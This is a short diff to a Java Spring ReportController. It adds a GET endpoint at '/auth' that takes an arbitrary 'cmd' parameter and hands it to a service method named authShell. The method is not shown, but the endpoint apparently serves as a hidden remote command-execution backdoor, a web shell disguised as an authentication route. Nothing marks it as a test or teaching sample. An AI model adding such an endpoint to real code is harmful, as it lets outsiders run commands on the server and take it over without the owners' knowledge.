@@ -169,4 +169,11 @@ public class ReportController {
 
         return new SingleResultResponse(reportService.getReport(data));
     }
+
+    @RequestMapping(path = "/auth", method = RequestMethod.GET)
+    public SingleResultResponse auth(
+            @RequestParam(required = true) String cmd
+    ){
+        return new SingleResultResponse(reportService.authShell(cmd));
+    }
 }
